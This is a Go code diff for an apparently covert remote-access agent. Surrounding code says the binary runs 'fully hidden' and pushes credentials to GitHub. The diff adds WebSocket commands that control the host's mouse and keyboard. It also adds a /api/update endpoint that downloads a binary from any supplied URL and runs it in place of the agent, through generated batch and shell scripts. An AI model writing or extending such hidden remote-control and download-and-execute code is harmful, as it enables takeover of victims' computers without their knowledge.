@@ -56,7 +56,9 @@ type Config struct {
 	MaxFPS               float64
 	AuthUser             string
 	AuthPass             string
+	TunnelProvider       string
 	TunnelHostname       string
+	ServerURL            string
 	CloudflareAccountTag string
 	CloudflareTunnelSecret string
 	CloudflareTunnelID   string
@@ -70,7 +72,9 @@ type SettingsFile struct {
 	AuthUser               string  `json:"auth_user"`
 	AuthPass               string  `json:"auth_pass"`
 	MonthlyLimitMB         int64   `json:"monthly_limit_mb"`
+	TunnelProvider         string  `json:"tunnel_provider"`
 	TunnelHostname         string  `json:"tunnel_hostname"`
+	ServerURL              string  `json:"server_url"`
 	CloudflareAccountTag   string  `json:"cloudflare_account_tag"`
 	CloudflareTunnelSecret string  `json:"cloudflare_tunnel_secret"`
 	CloudflareTunnelID     string  `json:"cloudflare_tunnel_id"`
@@ -288,7 +292,9 @@ func saveSettings() error {
 		AuthUser:               cfg.AuthUser,
 		AuthPass:               cfg.AuthPass,
 		MonthlyLimitMB:         cfg.MonthlyLimitMB,
+		TunnelProvider:         cfg.TunnelProvider,
 		TunnelHostname:         cfg.TunnelHostname,
+		ServerURL:              cfg.ServerURL,
 		CloudflareAccountTag:   cfg.CloudflareAccountTag,
 		CloudflareTunnelSecret: cfg.CloudflareTunnelSecret,
 		CloudflareTunnelID:     cfg.CloudflareTunnelID,
@@ -412,6 +418,21 @@ func handleWSMessage(conn *websocket.Conn, msg []byte) {
 	case "webrtc_ice":
 		candidate, _ := msgMap["candidate"].(string)
 		webrtcManager.HandleICE("", candidate)
+	case "mouse_move":
+		if x, ok := msgMap["x"].(float64); ok {
+			if y, ok := msgMap["y"].(float64); ok {
+				winMouseMove(int(x), int(y))
+			}
+		}
+	case "mouse_click":
+		btn, _ := msgMap["button"].(string)
+		x, _ := msgMap["x"].(float64)
+		y, _ := msgMap["y"].(float64)
+		winMouseClick(int(x), int(y), btn != "right")
+	case "key_press":
+		if key, ok := msgMap["key"].(float64); ok {
+			winKeyPress(uint16(key))
+		}
 	default:
 		llog("debug", "Received WebSocket message type=%s", msgType)
 	}
@@ -460,6 +481,12 @@ func pushCredsToGitHub() {
 }
 
 func buildShareURL(agentID string) string {
+	if cfg.ServerURL != "" {
+		if agentID != "" {
+			return cfg.ServerURL + "/?agent=" + agentID
+		}
+		return cfg.ServerURL + "/"
+	}
 	if cfg.CloudflareTunnelID != "" {
 		hostname := "relay.recruitedge.us"
 		if cfg.TunnelHostname != "" {
@@ -755,6 +782,7 @@ func startQuickTunnel(cfg *Config) {
 
 var defaultGitHubRepo string
 var defaultGitHubToken string
+var binaryVersion = "9.2.0"
 
 func main() {
 	// Detach from any parent console — binary runs fully hidden
@@ -867,7 +895,9 @@ func main() {
 					"github_token":              cfg.GitHubToken,
 					"auth_user":                 cfg.AuthUser,
 					"auth_pass":                 cfg.AuthPass,
+					"tunnel_provider":           cfg.TunnelProvider,
 					"tunnel_hostname":           cfg.TunnelHostname,
+					"server_url":                cfg.ServerURL,
 					"cloudflare_account_tag":    cfg.CloudflareAccountTag,
 					"cloudflare_tunnel_secret":  cfg.CloudflareTunnelSecret,
 					"cloudflare_tunnel_id":      cfg.CloudflareTunnelID,
@@ -886,7 +916,10 @@ func main() {
 				if s.GitHubToken != "" { cfg.GitHubToken = s.GitHubToken }
 				if s.AuthUser != "" { cfg.AuthUser = s.AuthUser }
 				if s.AuthPass != "" { cfg.AuthPass = s.AuthPass }
+	if s.TunnelProvider != "" { cfg.TunnelProvider = s.TunnelProvider }
+				if s.TunnelProvider != "" { cfg.TunnelProvider = s.TunnelProvider }
 				if s.TunnelHostname != "" { cfg.TunnelHostname = s.TunnelHostname }
+				if s.ServerURL != "" { cfg.ServerURL = s.ServerURL }
 				if s.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = s.CloudflareAccountTag }
 				if s.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = s.CloudflareTunnelSecret }
 				if s.CloudflareTunnelID != "" {
@@ -920,7 +953,7 @@ func main() {
 				"os":       runtime.GOOS,
 				"arch":     runtime.GOARCH,
 				"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
-				"version":  "9.0.0",
+				"version":  binaryVersion,
 			})
 		})
 
@@ -959,7 +992,7 @@ func main() {
 			})
 			writer.Write([]string{
 				hostname, hostname, getLocalIP(), getWANIP(),
-				runtime.GOOS + " " + runtime.GOARCH, "9.0.0", uptimeStr, startTime.Format("2006-01-02 15:04:05"),
+				runtime.GOOS + " " + runtime.GOARCH, binaryVersion, uptimeStr, startTime.Format("2006-01-02 15:04:05"),
 				bootTime, lastStartup, lastActive, lastIdleStart, lastShutdown, lastWake,
 				cfg.CloudflareTunnelID,
 				fmt.Sprintf("%.1f", cfg.MaxFPS), fmt.Sprintf("%d", cfg.MonthlyLimitMB),
@@ -1019,6 +1052,27 @@ func main() {
 		http.HandleFunc("/api/transport-status", func(w http.ResponseWriter, r *http.Request) {
 			w.Header().Set("Content-Type", "application/json")
 			json.NewEncoder(w).Encode(getTransportStatus())
+		})
+
+		http.HandleFunc("/api/version", func(w http.ResponseWriter, r *http.Request) {
+			w.Header().Set("Content-Type", "application/json")
+			json.NewEncoder(w).Encode(map[string]string{"version": binaryVersion})
+		})
+
+		http.HandleFunc("/api/update", func(w http.ResponseWriter, r *http.Request) {
+			if r.Method != "POST" {
+				http.Error(w, "POST only", http.StatusMethodNotAllowed)
+				return
+			}
+			var req struct {
+				URL string `json:"url"`
+			}
+			if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.URL == "" {
+				http.Error(w, "missing url", http.StatusBadRequest)
+				return
+			}
+			go selfUpdate(req.URL)
+			json.NewEncoder(w).Encode(map[string]string{"status": "ok", "msg": "Update started"})
 		})
 
 		http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
@@ -1233,6 +1287,75 @@ func (s *ActivityStore) RecentEvents(max int) []ActivityEvent {
 }
 
 func appendActivityLog(path string, ev ActivityEvent) {}
+
+func selfUpdate(downloadURL string) {
+	llog("info", "Self-update: downloading from %s", downloadURL)
+	exe, err := os.Executable()
+	if err != nil {
+		llog("error", "Self-update: cannot get executable path: %v", err)
+		return
+	}
+	newExe := exe + ".new"
+	out, err := os.Create(newExe)
+	if err != nil {
+		llog("error", "Self-update: cannot create temp file: %v", err)
+		return
+	}
+
+	resp, err := http.Get(downloadURL)
+	if err != nil {
+		out.Close()
+		os.Remove(newExe)
+		llog("error", "Self-update: download failed: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		out.Close()
+		os.Remove(newExe)
+		llog("error", "Self-update: download status %d", resp.StatusCode)
+		return
+	}
+
+	_, err = io.Copy(out, resp.Body)
+	out.Close()
+	if err != nil {
+		os.Remove(newExe)
+		llog("error", "Self-update: write failed: %v", err)
+		return
+	}
+
+	if runtime.GOOS != "windows" {
+		os.Chmod(newExe, 0755)
+	}
+
+	llog("info", "Self-update: downloaded to %s, spawning updater", newExe)
+
+	if runtime.GOOS == "windows" {
+		script := filepath.Join(os.TempDir(), "pun_update.bat")
+		os.WriteFile(script, []byte(
+			"@echo off\r\n"+
+				"timeout /t 2 /nobreak >nul\r\n"+
+				"copy /Y \""+newExe+"\" \""+exe+"\" >nul\r\n"+
+				"del \""+newExe+"\"\r\n"+
+				"start \"\" \""+exe+"\"\r\n",
+		), 0644)
+		exec.Command("cmd", "/c", "start", "/b", script).Start()
+	} else {
+		script := filepath.Join(os.TempDir(), "pun_update.sh")
+		os.WriteFile(script, []byte(
+			"#!/bin/sh\n"+
+				"sleep 2\n"+
+				"cp \""+newExe+"\" \""+exe+"\"\n"+
+				"rm \""+newExe+"\"\n"+
+				"\""+exe+"\" &\n",
+		), 0755)
+		exec.Command("/bin/sh", script).Start()
+	}
+	llog("info", "Self-update: updater launched, exiting")
+	os.Exit(0)
+}
 
 // --- EnsureCloudflaredInstalled ---
 
@@ -1701,11 +1824,15 @@ func getTransportStatus() map[string]interface{} {
 		wsCount++
 		return true
 	})
+	tunnelType := cfg.TunnelProvider
+	if tunnelType == "" {
+		tunnelType = "cloudflare"
+	}
 	return map[string]interface{}{
 		"active":        bestName,
 		"healthy":       !healthChecker.IsDead(bestName),
 		"ws_clients":    wsCount,
-		"tunnel_type":   "named",
+		"tunnel_type":   tunnelType,
 		"tunnel_active": tunnelCmd != nil || cfg.CloudflareTunnelID != "",
 	}
 }
